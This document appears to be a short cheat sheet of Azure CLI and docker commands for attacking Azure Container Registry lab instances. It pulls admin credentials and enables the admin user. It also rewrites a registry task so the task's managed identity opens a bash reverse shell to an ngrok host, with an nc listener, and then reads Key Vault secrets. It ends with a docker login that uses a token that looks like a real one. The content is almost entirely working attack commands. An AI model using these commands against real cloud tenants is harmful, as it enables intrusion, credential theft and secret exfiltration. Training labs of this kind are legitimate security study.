# Azure Container Registry

## Enable Admin Key

```sh
az acr list

# Get admin creds
az rest --method POST --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/container-registry-labs/providers/Microsoft.ContainerRegistry/registries/containerRegistryLab102fedb58/listCredentials?api-version=2023-11-01-preview"

# If not enabled
az acr update -n containerRegistryLab102fedb58 --admin-enabled
az rest --method PATCH --uri "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/container-registry-labs/providers/Microsoft.ContainerRegistry/registries/containerRegistryLab102fedb58?api-version=2023-11-01-preview" --body '{"properties": {"adminUserEnabled": true}}'

az acr repository list -n containerRegistryLab102fedb58

docker pull containerRegistryLab102fedb58.azurecr.io/container_registry_lab_1

docker run -it containerRegistryLab102fedb58.azurecr.io/container_registry_lab_1 sh
```

## Modify a task with a Manage­d Identi­ty

```sh
az acr list
az keyvault list
az keyvault secret list --vault-name acr-2-02fedb58f8

az acr task list -r containerRegistryLab202fedb58 # check for identity

az acr task update -r containerRegistryLab202fedb58 -n containerRegistryLab202fedb58 --cmd 'bash -c "bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/14466 0>&1"' -c "/dev/null"
az acr task run -r containerRegistryLab202fedb58 -n containerRegistryLab202fedb58

# Ngrok + listener
ngrok tcp 2323
nc -lvnp 2323

# Once access token collected
az keyvault secret show --vault-name acr-2-02fedb58f8 -n acr-2-02fedb58-f8761
```

## Genera­te token keys

```sh

az acr repository list -n containerRegistryLab302fedb58

docker login containerRegistryLab302fedb58.azurecr.io -u "tokenacr" -p "6d7iYwWpItBz9Yv30AUk0v2Hp28uf7cWohTDEIYBQ6qmDWbbbIujJQQJ99CDAC1i4TkEqg7NAAABAZCRg0FV"
docker pull containerRegistryLab302fedb58.azurecr.io/container_registry_lab_1

```
